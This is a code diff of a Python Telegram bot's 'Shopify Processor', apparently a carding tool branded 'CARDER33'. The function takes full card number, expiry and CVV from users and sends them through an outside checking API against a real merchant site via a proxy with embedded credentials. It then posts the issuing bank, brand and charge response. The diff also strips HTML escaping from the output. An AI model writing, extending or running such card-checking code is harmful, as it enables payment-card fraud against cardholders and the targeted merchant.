@@ -2088,6 +2088,17 @@ async def consume_credit(user_id: int) -> bool:
 
 # --- Shopify Processor ---
 
+import asyncio
+import aiohttp
+import json
+import logging
+from html import escape
+from telegram import Update
+from telegram.ext import ContextTypes
+from telegram.constants import ParseMode
+
+logger = logging.getLogger(__name__)
+
 async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     try:
         user = update.effective_user
@@ -2108,30 +2119,29 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         cc, mm, yy, cvv = [p.strip() for p in parts]
         full_card = f"{cc}|{mm}|{yy}|{cvv}"
-        cc_normalized = cc.strip()
 
         # --- Clickable bullet ---
         BULLET_GROUP_LINK = "https://t.me/CARDER33"
         bullet_link = f"[⌇]({BULLET_GROUP_LINK})"
 
-        # --- Gateway & status for initial message ---
-        gateway_text = escape_markdown("Gateway ➜ #Shopify", version=2)
-        status_text = escape_markdown("Status ➜ Checking 🔎...", version=2)
+        # --- Gateway & status for processing message ---
+        gateway_text = "**Gateway ➜ #Shopify**"
+        status_text = "**Status ➜ Checking 🔎...**"
 
         # --- Send initial processing message ---
         processing_text = (
-            "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```" + "\n"
-            f"```{cc_normalized}```" + "\n\n"
+            "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳\n"
+            f"`{full_card}`\n\n"
             f"{bullet_link} {gateway_text}\n"
-            f"{bullet_link} {status_text}\n"
+            f"{bullet_link} {status_text}"
         )
         processing_msg = await update.message.reply_text(
             processing_text,
-            parse_mode=ParseMode.MARKDOWN_V2,
+            parse_mode=ParseMode.MARKDOWN,
             disable_web_page_preview=True
         )
 
-        # --- API URL ---
+        # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://craneandcanopy.com"
@@ -2139,7 +2149,6 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
-        # --- Make API request ---
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                 api_response = await resp.text()
@@ -2183,26 +2192,26 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        # --- Final formatted message ---
-        formatted_msg = (
+        # --- Final message ---
+        final_msg = (
             f"═══[ <b>SHOPIFY</b> ]═══\n"
-            f"{bullet_link} <b>Card</b> ➜ <code>{escape(full_card)}</code>\n"
-            f"{bullet_link} <b>Gateway</b> ➜ {escape(gateway)}\n"
-            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response)}</i>\n"
-            f"{bullet_link} <b>Price</b> ➜ {escape(price)} 💸\n"
+            f"{bullet_link} <b>Card</b> ➜ <code>{full_card}</code>\n"
+            f"{bullet_link} <b>Gateway</b> ➜ {gateway}\n"
+            f"{bullet_link} <b>Response</b> ➜ {response}\n"
+            f"{bullet_link} <b>Price</b> ➜ {price} 💸\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} <b>Brand</b> ➜ <code>{escape(brand)}</code>\n"
-            f"{bullet_link} <b>Bank</b> ➜ <code>{escape(issuer)}</code>\n"
-            f"{bullet_link} <b>Country</b> ➜ <code>{escape(country_name)} {country_flag}</code>\n"
+            f"{bullet_link} <b>Brand</b> ➜ {brand}\n"
+            f"{bullet_link} <b>Bank</b> ➜ {issuer}\n"
+            f"{bullet_link} <b>Country</b> ➜ {country_name} {country_flag}\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>Request By</b> ➜ {requester}\n"
             f"{bullet_link} <b>Developer</b> ➜ {developer_clickable}\n"
             f"――――――――――――――――"
         )
 
-        # --- Edit the processing message with final output ---
+        # --- Edit the same message ---
         await processing_msg.edit_text(
-            formatted_msg,
+            final_msg,
             parse_mode=ParseMode.HTML,
             disable_web_page_preview=True
         )
@@ -2216,7 +2225,6 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
         except Exception:
             pass
-
 
 
 
